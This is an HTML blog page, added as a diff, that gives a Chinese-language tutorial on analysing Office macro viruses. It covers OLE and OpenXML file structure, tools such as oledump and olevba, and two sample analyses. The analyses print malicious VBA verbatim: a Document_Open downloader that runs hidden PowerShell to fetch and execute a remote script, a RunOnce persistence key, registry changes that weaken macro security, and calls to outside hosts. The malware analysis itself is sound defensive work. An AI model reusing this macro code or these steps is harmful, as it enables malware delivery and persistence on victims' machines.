@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="false" > 
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+
+  
+  <title>宏病毒分析整理 | NOK</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+
+  <meta name="description" content="基础信息现在通常文档中的宏是被禁用的，选择“启用内容”后，宏才会执行。  在选项中勾选开发工具  选择Visual Basic，即可打开VB编辑器，查看宏代码。或者使用快捷键“Alt+F11”打开。  执行恶意功能的宏就是宏病毒，使用VBA编写。宏病毒只在Microsoft Office办公软件创建的电子文档中感染。 office文件版本office文件格式根据版本可分为Office2007之前的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="宏病毒分析整理">
+<meta property="og:url" content="http://example.com/2024/06/15/%E5%AE%8F%E7%97%85%E6%AF%92/index.html">
+<meta property="og:site_name" content="NOK">
+<meta property="og:description" content="基础信息现在通常文档中的宏是被禁用的，选择“启用内容”后，宏才会执行。  在选项中勾选开发工具  选择Visual Basic，即可打开VB编辑器，查看宏代码。或者使用快捷键“Alt+F11”打开。  执行恶意功能的宏就是宏病毒，使用VBA编写。宏病毒只在Microsoft Office办公软件创建的电子文档中感染。 office文件版本office文件格式根据版本可分为Office2007之前的">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2024/07/28/2GrkKIqDpj9oiVf.png">
+<meta property="og:image" content="https://s2.loli.net/2024/07/28/AjHqW7SpR5trugm.png">
+<meta property="og:image" content="https://s2.loli.net/2024/07/28/q9uGE2QWMgdNcLl.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/nickyl07/image/PicGo/202407301833062.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/nickyl07/image/PicGo/202407301833779.png">
+<meta property="og:image" content="https://s2.loli.net/2024/07/28/lyOWLtdMBjpXrP6.png">
+<meta property="og:image" content="https://s2.loli.net/2024/07/28/OZDGU5vYNBrqIa3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/nickyl07/image/PicGo/202407291829125.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/nickyl07/image/PicGo/202407291828146.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/nickyl07/image/PicGo/202407291831475.png">
+<meta property="og:image" content="https://bbs.kanxue.com/upload/attach/202106/755584_YYYAKUQHNPX2UBU.png">
+<meta property="og:image" content="https://bbs.kanxue.com/upload/attach/202106/755584_ME2HV8S7NMFU669.png">
+<meta property="og:image" content="https://bbs.kanxue.com/upload/attach/202106/755584_W6FUSBTRF29X23D.png">
+<meta property="og:image" content="https://bbs.kanxue.com/upload/attach/202106/755584_A5MBPGQSG5MXN5V.png">
+<meta property="og:image" content="https://bbs.kanxue.com/upload/attach/202106/755584_JCHZGTEB7PK2HGY.png">
+<meta property="og:image" content="https://bbs.kanxue.com/upload/attach/202106/755584_W3JPKGUAC5AJMCQ.png">
+<meta property="og:image" content="https://bbs.kanxue.com/upload/attach/202106/755584_BAYW7MEGHARCS3X.png">
+<meta property="og:image" content="https://bbs.kanxue.com/upload/attach/202106/755584_YVKEE25YDV9MFZV.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/nickyl07/image/PicGo/202408011404136.png">
+<meta property="og:image" content="https://pentestlab.blog/wp-content/uploads/2017/12/websettings-xml-relationship-file-contents.png?w=760">
+<meta property="og:image" content="https://s2.loli.net/2024/08/04/oabOzXvcCm947kF.png">
+<meta property="og:image" content="https://bbs.kanxue.com/upload/attach/202106/755584_XUENBEXAKA6PTR8.png">
+<meta property="og:image" content="https://bbs.kanxue.com/upload/attach/202106/755584_EVD2GU6H4EFWJMB.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/nickyl07/image/PicGo/202407301833032.png">
+<meta property="og:image" content="https://attach.52pojie.cn/forum/202205/10/142739glu77d9dburldwzv.png">
+<meta property="og:image" content="https://attach.52pojie.cn/forum/202205/10/142721qrq4811r7nq8a8rm.png">
+<meta property="og:image" content="https://attach.52pojie.cn/forum/202205/10/142730mllchcbwdh7h0dvj.png">
+<meta property="og:image" content="https://attach.52pojie.cn/forum/202205/10/142732rcaogeowc5ywbkqc.png">
+<meta property="article:published_time" content="2024-06-15T10:40:09.000Z">
+<meta property="article:modified_time" content="2024-08-04T15:07:47.318Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/07/28/2GrkKIqDpj9oiVf.png">
+  
+    <link rel="alternate" href="/atom.xml" title="NOK" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/xslove.png">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  
+   
+  <div id="main-grid" class="  ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>NOK </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/archives">Archives</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
+      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
+      </a>
+    
+    <div id="nav-menu-btn" class="nav-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/archives">Archives</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=/images/20240728173338.jpg></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">NOK </div>
+      <div class="dot"></div>
+      <div class="subtitle">Share my life </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/nickyl07" title="GitHub"><i class="fa-brands fa-github"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+  <div class="sticky">
+    
+      
+
+
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Categories</h3>
+      <div class="category-box">
+            <a class="category-link" href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/">
+                样本分析
+                <div class="category-count">2</div>
+            </a>
+        
+            <a class="category-link" href="/categories/%E8%B0%83%E7%A0%94/">
+                调研
+                <div class="category-count">3</div>
+            </a>
+        </div>
+    </div>
+  </div>
+
+
+    
+      
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+
+<article id="post-宏病毒" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        宏病毒分析整理
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2024-06-15T10:40:09.000Z" itemprop="datePublished">2024-06-15</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+  <a class="meta-cate-link" href="/categories/%E8%B0%83%E7%A0%94/">调研</a>
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            10k words 
+          </div>
+        </div>
+        
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <h2 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h2><p>现在通常文档中的宏是被禁用的，选择“启用内容”后，宏才会执行。</p>
+<p><img src="https://s2.loli.net/2024/07/28/2GrkKIqDpj9oiVf.png" alt="image-20240728185305988"></p>
+<p>在选项中勾选开发工具</p>
+<p><img src="https://s2.loli.net/2024/07/28/AjHqW7SpR5trugm.png" alt="image-20240728185456720"></p>
+<p>选择Visual Basic，即可打开VB编辑器，查看宏代码。或者使用快捷键“Alt+F11”打开。</p>
+<p><img src="https://s2.loli.net/2024/07/28/q9uGE2QWMgdNcLl.png" alt="image-20240728185522358"></p>
+<p>执行恶意功能的宏就是宏病毒，使用VBA编写。宏病毒只在Microsoft Office办公软件创建的电子文档中感染。</p>
+<h2 id="office文件版本"><a href="#office文件版本" class="headerlink" title="office文件版本"></a>office文件版本</h2><p>office文件格式根据版本可分为Office2007之前的版本和之后的版本。<br>Office2007之前的版本为OLE复合格式：doc,dot,xls,xlt,pot,ppt<br>Office2007之后的版本为OpenXML格式：docx,docm,dotx,xlsx,xlsm,xltx,potx</p>
+<p>doc、xls、ppt三种扩展名文档属于97-2003版Office，可解析出ole格式文件。<br>docm、xlsm、pptm 是启用宏的Office文档，存储VBA宏代码，可解析出xml文件。<br>docx、xlsx、pptx 三种扩展名文档可解析出xml文件。<br>ppsx是2007的PPT的一种格式，打开就是幻灯片播放模式。</p>
+<h2 id="office复合文档"><a href="#office复合文档" class="headerlink" title="office复合文档"></a>office复合文档</h2><p>Office文档（如：.doc、.ppt、.xls等）很多是复合文档（OLE文件）。<br>① 复合文档将数据分成许多流（Steams），流存储在不同的 Storages 里。<br>② 复合文档采用NTFS（NT File System）格式。<br>③ 流又分成更小的数据扇区（sectors），数据扇区可能包含控制数据或用户数据。<br>④ 整个文件由一个头结构（Header) 结构以及 Sectors 组成，头结构确定了 Sectors 的大小，每个 Sector 的大小相同。</p>
+<p> OLE文件数据都是以扇区为单位进行存储的。扇区内存储的数据种类有Stroage、Stream、Directory、FAT、DIF等数据。<br>FAT是索引表，记录了该扇区指向的下一个扇区的地址。<br>DIFAT是分区表，是FAT的索引表。<br>Directory是用来记录Storage和Stream的存储结构以及它们的名称、大小、起始地址等信息。<br>Storage和Stream相当于文件系统中文件夹和文件。<br>一个office文档文件的所有数据都是记录在stream上的。Office将各个部分的数据模块化，不同的数据则会记录在不同的Storage下，如doc文件中的文本内容一般记录在\Root Entry\WordDocument中，而与宏有关的内容则会记录在\Root Entry\Macros\中。</p>
+<h2 id="office文件构成"><a href="#office文件构成" class="headerlink" title="office文件构成"></a>office文件构成</h2><p>.doc文件是一种普通的OLE文件(复合文件)，能够包含宏。而.docx和.docm文件，实际上都是是压缩文件。</p>
+<p>.doc文件头二进制数据</p>
+<p><img src="https://raw.githubusercontent.com/nickyl07/image/PicGo/202407301833062.png" alt="image-20240730174626159"></p>
+<p>docx.docx文件结构</p>
+<p><img src="https://raw.githubusercontent.com/nickyl07/image/PicGo/202407301833779.png" alt="image-20240730175852898"></p>
+<ul>
+<li>[Content_Types].xml：描述文档各个部分（如：docment.xml)的ContentType，以便程序在显示文档时知道如何解析该部分。</li>
+<li>_rels&#x2F;文件夹：</li>
+<li>*.rels：其中有Relationships标签，代表两部分之间的联系。</li>
+<li>docProps&#x2F; 文件夹：</li>
+<li>app.xml：程序级别的文档属性，如：页数、文本行数、程序版本等</li>
+<li>core.xml：用户填写的文档属性，如：标题、主题、作者等</li>
+<li>word&#x2F;文件夹：</li>
+<li>_rels&#x2F;document.xml.rels：Relationships使用ID和URL来定位文档各零件</li>
+<li>_rels&#x2F;settings.xml.rel：Relationships使用ID和URL来定位文档各零件</li>
+<li>styles.xml：包含文档的各种样式列表</li>
+<li>document.xml：记录Word文档的正文内容</li>
+<li>fontTable.xml：包含文档字体设置</li>
+<li>footnotes.xml：记录Word文档的脚注；</li>
+<li>endnotes.xml：记录Word文档的尾注；</li>
+</ul>
+<p>利用同样的方式打开.docm文件，可以发现和.docx文件的内容基本相同，但是比.docx文件多了一个文件：</p>
+<p>vbaProject.bin：这是一个复合文件，记录vba工程信息。</p>
+<h2 id="解析工具"><a href="#解析工具" class="headerlink" title="解析工具"></a>解析工具</h2><h3 id="oletools"><a href="#oletools" class="headerlink" title="oletools"></a>oletools</h3><p><a target="_blank" rel="noopener" href="http://www.decalage.info/python/oletools">oletools</a> 是一个 Python 工具包，用于分析 <a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/Compound_File_Binary_Format">Microsoft OLE2 文件</a>（也称为结构化存储、复合文件二进制格式或复合文档文件格式），例如 Microsoft Office 文档或 Outlook 消息，主要用于恶意软件分析、取证和调试。它基于 <a target="_blank" rel="noopener" href="http://www.decalage.info/olefile">olefile</a> 解析器。</p>
+<p>有关详细信息，<a target="_blank" rel="noopener" href="http://www.decalage.info/python/oletools">请参阅 http://www.decalage.info/python/oletools</a>。</p>
+<h3 id="oledump"><a href="#oledump" class="headerlink" title="oledump"></a>oledump</h3><p>oledump.py 是分析OLE文件（<a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/Compound_File_Binary_Format">复合文件二进制格式</a>）的程序。这些文件包含数据流。oledump 允许您分析这些流。具体过程如下：</p>
+<p>  1.读取文件流。</p>
+<p>  2.识别可能包含要查找的内容的结构。</p>
+<p>  3.通过第一个结构，找到下一节的位置。</p>
+<p>  4.在流中转到该节。</p>
+<p>  5.重复前面两个步骤，直到找到所需的内容。</p>
+<p>  6.读取并分析内容。</p>
+<p>查看oledump.py 的帮助信息：oledump.py -m</p>
+<p>有关详细信息，<a target="_blank" rel="noopener" href="https://blog.didierstevens.com/programs/oledump-py/">请参阅 https://blog.didierstevens.com/programs/oledump-py/</a></p>
+<h3 id="olevba"><a href="#olevba" class="headerlink" title="olevba"></a>olevba</h3><p>检测提取文档中的vba脚本，–decode:解密字符串，–reveal:将源码中的混淆字符串用解密字符串代替。</p>
+<h3 id="VBA-Password-Bypasser"><a href="#VBA-Password-Bypasser" class="headerlink" title="VBA Password Bypasser"></a>VBA Password Bypasser</h3><p>“VBA Password Reset a”是一款宏文档密码恢复插件，可以从大多数VBA项目中快速将密码重置为“a”。</p>
+<h3 id="OffVis"><a href="#OffVis" class="headerlink" title="OffVis"></a>OffVis</h3><p>微软提供的office二进制格式查看工具</p>
+<h2 id="样例分析"><a href="#样例分析" class="headerlink" title="样例分析"></a>样例分析</h2><h3 id="样本"><a href="#样本" class="headerlink" title="样本"></a>样本</h3><h4 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h4><p>File:demo2.doc</p>
+<p>sha1:9abeef3ed793f28a24562c3e5c3104eee99daa1c</p>
+<p><img src="https://s2.loli.net/2024/07/28/lyOWLtdMBjpXrP6.png" alt="image-20240728234520091"></p>
+<p>查看VBA，宏被加密了，提示需要密码</p>
+<p><img src="https://s2.loli.net/2024/07/28/OZDGU5vYNBrqIa3.png" alt="image-20240728234740973"></p>
+<h5 id="使用工具VBA-Password-Bypasser解密"><a href="#使用工具VBA-Password-Bypasser解密" class="headerlink" title="使用工具VBA Password Bypasser解密"></a>使用工具VBA Password Bypasser解密</h5><p><img src="https://raw.githubusercontent.com/nickyl07/image/PicGo/202407291829125.png" alt="image-20240729105913939"></p>
+<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Private</span> <span class="keyword">Sub</span> Document_Open()</span><br><span class="line"><span class="keyword">Dim</span> CGJKIYRSDGHJHGFFG <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">CGJKIYRSDGHJHGFFG = <span class="string">&quot;cmd /K &quot;</span> + <span class="string">&quot;pow&quot;</span> + <span class="string">&quot;eR&quot;</span> &amp; <span class="string">&quot;sh&quot;</span> + <span class="string">&quot;ell.e&quot;</span> + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;e -WindowStyle hiddeN -ExecuTionPolicy BypasS -noprofile (New-Object System.Net.WebClient).DownloadFile(&#x27;http://skycpa.in/file.php&#x27;,&#x27;%TEMP%\Y.ps1&#x27;); poWerShEll.exe -WindowStyle hiddeN -ExecutionPolicy Bypass -noprofile -file %TEMP%\Y.ps1&quot;</span></span><br><span class="line">Shell CGJKIYRSDGHJHGFFG, <span class="number">0</span></span><br><span class="line">MsgBox (<span class="string">&quot;Unreferenced library required&quot;</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>
+
+<p>下载执行Y.ps1</p>
+<h5 id="使用oledump分析流"><a href="#使用oledump分析流" class="headerlink" title="使用oledump分析流"></a>使用oledump分析流</h5><p>oledump.py  demo2.doc</p>
+<p><img src="https://raw.githubusercontent.com/nickyl07/image/PicGo/202407291828146.png" alt="image-20240729115501892"></p>
+<p>列出此文件的Stream数据，标记字母‘M’的一行，表示这段数据中存在宏。</p>
+<p>oledump.py -s  段号：选择分析出的某一段来查看内容</p>
+<p>oledump.py -v：解压缩VBA宏</p>
+<p>两个参数结合：oledump.py -s A3 -v demo2.doc</p>
+<p><img src="https://raw.githubusercontent.com/nickyl07/image/PicGo/202407291831475.png" alt="image-20240729183145915"></p>
+<p>参数选择‘a’，表示分析所有段的数据，使用‘&gt;’，宏代码数据将存储在新文件中</p>
+<p>oledump.py -s a -v demo2.doc&gt;1.txt</p>
+<p>decoder_ay.py -d：将文件中的exe数据dump下来</p>
+<p>oledump.py -s 14  -D decoder_ay.py -d 1.doc  &gt;1.exe</p>
+<h3 id="样本-1"><a href="#样本-1" class="headerlink" title="样本"></a>样本</h3><h4 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h4><p>File:bab93bc258ed673a849e8a8a6da080cf82e3dab3fdb29f6ae42031280cda49ef</p>
+<p>md5:71c7d149cec1d8a3a7e54711b3b64383</p>
+<p><img src="https://bbs.kanxue.com/upload/attach/202106/755584_YYYAKUQHNPX2UBU.png" alt="图片描述"></p>
+<h5 id="使用动态调试的方法"><a href="#使用动态调试的方法" class="headerlink" title="使用动态调试的方法"></a>使用动态调试的方法</h5><p>点击视图开启立即窗口、本地窗口和监视窗口<br><img src="https://bbs.kanxue.com/upload/attach/202106/755584_ME2HV8S7NMFU669.png" alt="图片描述"><br>Set nZsXAIAmrwsMOxkvh &#x3D; gxUVYeacLIkNroPKoYAd.CreateTextFile(oCHIUZS, True, True)，创建了一个文件，直接查看比较麻烦，通过设置断点，查看变量的方法可以容易的知道创建的文件为”C:\Users\abel\Downloads\deer.ini”，后续要关注这个文件<br><img src="https://bbs.kanxue.com/upload/attach/202106/755584_W6FUSBTRF29X23D.png" alt="图片描述"><br>接着上面就是大量的字符串拼接，之后应该会进行解密写文件操作，可以跳过这段代码下断点<br><img src="https://bbs.kanxue.com/upload/attach/202106/755584_A5MBPGQSG5MXN5V.png" alt="图片描述"><br>UNMfYyPswUtPDcyphmZwEXyU先对字符串进行了base64的解密，再写入到了“C:\Users\abel\Downloads\deer.ini”文件中<br><img src="https://bbs.kanxue.com/upload/attach/202106/755584_JCHZGTEB7PK2HGY.png" alt="图片描述"><br>执行生成的vba脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set oShell = CreateObject(&quot;Shell.Application&quot;)</span><br><span class="line">CallByName oShell, &quot;ShellExecute&quot;, VbMethod, &quot;wscript.exe&quot;, &quot;C:\Users\abel\Downloads\deer.ini //e:VBScript //b&quot;, &quot;&quot;, &quot;&quot;, 0</span><br></pre></td></tr></table></figure>
+
+<p>最后写注册表”HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\deer”, “wscript.exe C:\Users\abel\Downloads\deer.ini &#x2F;&#x2F;e:VBScript &#x2F;&#x2F;b”, “REG_SZ”实现自启<br><img src="https://bbs.kanxue.com/upload/attach/202106/755584_W3JPKGUAC5AJMCQ.png" alt="图片描述"><br><strong>deer.ini分析</strong><br>创建一个word，启动visualBasic编辑器，并将beer.ini的内容复制进去。<br>首先创建了一个字符串”C:\Users\abel\deer.exe”<br><img src="https://bbs.kanxue.com/upload/attach/202106/755584_BAYW7MEGHARCS3X.png" alt="图片描述"><br>写注册表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Word\Security\AccessVBOM为1 HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Word\Security\VBAWarnings</span><br></pre></td></tr></table></figure>
+
+<p>使用WMI测试是否能ping通coagula.online</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;SELECT * FROM Win32_PingStatus WHERE Address=&quot; + &quot;&#x27;coagula.online&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>可以使用debug.print调试输出url，得到一个url“<a target="_blank" rel="noopener" href="http://83.166.240.31/get.php?independent=%E2%80%9D">http://83.166.240.31/get.php?independent=”</a><br><img src="https://bbs.kanxue.com/upload/attach/202106/755584_YVKEE25YDV9MFZV.png" alt="图片描述"></p>
+<h2 id="宏病毒的恶意利用手段"><a href="#宏病毒的恶意利用手段" class="headerlink" title="宏病毒的恶意利用手段"></a>宏病毒的恶意利用手段</h2><p>宏病毒的恶意利用手段主要体现在对Windows API和外部例程的调用。</p>
+<table>
+<thead>
+<tr>
+<th>外部例程</th>
+<th>介绍</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MSXML2.ServerXMLHTTP</td>
+<td>Xmlhttp是一种浏览器对象， 可用于模拟http的GET和POST请求</td>
+</tr>
+<tr>
+<td>Net.WebClient</td>
+<td>提供网络服务</td>
+</tr>
+<tr>
+<td>Adodb.Stream</td>
+<td>Stream 流对象用于表示数据流。配合XMLHTTP服务使用Stream对象可以从网站上下载各种可执行程序</td>
+</tr>
+<tr>
+<td>Wscript.shell</td>
+<td>WScript.Shell是WshShell对象的ProgID，创建WshShell对象可以运行程序、操作注册表、创建快捷方式、访问系统文件夹、管理环境变量。</td>
+</tr>
+<tr>
+<td>Poweshell</td>
+<td>PowerShell.exe 是微软提供的一种命令行shell程序和脚本环境</td>
+</tr>
+<tr>
+<td>Application.Run</td>
+<td>调用该函数，可以运行.exe文件</td>
+</tr>
+<tr>
+<td>WMI</td>
+<td>用户可以利用 WMI 管理计算机，在宏病毒中主要通过winmgmts:\.\root\CIMV2隐藏启动进程</td>
+</tr>
+<tr>
+<td>Shell.Application</td>
+<td>能够执行sehll命令</td>
+</tr>
+</tbody></table>
+<h3 id="远程模板注入执行宏"><a href="#远程模板注入执行宏" class="headerlink" title="远程模板注入执行宏"></a>远程模板注入执行宏</h3><p>本地文件中没有宏，利用文档模板尝试执行远程文件中宏。</p>
